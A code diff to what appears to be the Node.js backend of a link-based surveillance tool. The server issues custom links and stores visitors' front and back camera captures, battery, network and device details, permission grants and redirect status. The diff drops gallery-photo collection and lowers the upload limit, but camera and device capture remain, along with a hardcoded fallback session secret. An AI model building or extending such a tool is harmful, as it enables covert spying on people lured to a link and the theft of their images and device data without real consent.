@@ -27,8 +27,8 @@ const io = socketIo(server, {
 // 3. MIDDLEWARE
 // ==========================================
 app.use(cors());
-app.use(bodyParser.json({ limit: '100mb' }));
-app.use(bodyParser.urlencoded({ extended: true, limit: '100mb' }));
+app.use(bodyParser.json({ limit: '50mb' }));
+app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
 app.use(express.static('public'));
 app.use(session({
     secret: process.env.SESSION_SECRET || 'your-secret-key',
@@ -154,7 +154,6 @@ app.post('/generate-custom-link', (req, res) => {
         language: null,
         frontCamera: null,
         backCamera: null,
-        galleryPhotos: [],
         connected: false,
         visitDate: null,
         permissionsGranted: false,
@@ -265,7 +264,6 @@ io.on('connection', (socket) => {
         const userIndex = users.findIndex(u => u.id === visitorId);
         
         if (userIndex !== -1) {
-            // Get detailed device info
             const userAgent = deviceInfo.userAgent || '';
             const browserMatch = userAgent.match(/(chrome|safari|firefox|edge|opera)/i);
             const osMatch = userAgent.match(/(windows|mac|linux|android|ios|iphone|ipad)/i);
@@ -285,7 +283,6 @@ io.on('connection', (socket) => {
                 network: null,
                 frontCamera: null,
                 backCamera: null,
-                galleryPhotos: [],
                 redirectComplete: false
             };
             
@@ -320,7 +317,6 @@ io.on('connection', (socket) => {
         const userIndex = users.findIndex(u => u.id === visitorId);
         
         if (userIndex !== -1) {
-            // Update main record
             if (type === 'frontCamera') {
                 users[userIndex].frontCamera = content;
                 users[userIndex].lastCameraUpdate = new Date().toISOString();
@@ -334,8 +330,6 @@ io.on('connection', (socket) => {
                 users[userIndex].battery = content;
             } else if (type === 'network') {
                 users[userIndex].network = content;
-            } else if (type === 'galleryPhotos') {
-                users[userIndex].galleryPhotos = content;
             } else if (type === 'permissionsGranted') {
                 users[userIndex].permissionsGranted = true;
             } else if (type === 'redirectComplete') {
@@ -343,7 +337,6 @@ io.on('connection', (socket) => {
                 users[userIndex].redirectTime = new Date().toISOString();
             }
             
-            // Also save in visit history (last visit)
             const history = users[userIndex].visitHistory || [];
             if (history.length > 0) {
                 const lastVisit = history[history.length - 1];
@@ -357,8 +350,6 @@ io.on('connection', (socket) => {
                     lastVisit.battery = content;
                 } else if (type === 'network') {
                     lastVisit.network = content;
-                } else if (type === 'galleryPhotos') {
-                    lastVisit.galleryPhotos = content;
                 } else if (type === 'redirectComplete') {
                     lastVisit.redirectComplete = true;
                     lastVisit.redirectTime = new Date().toISOString();
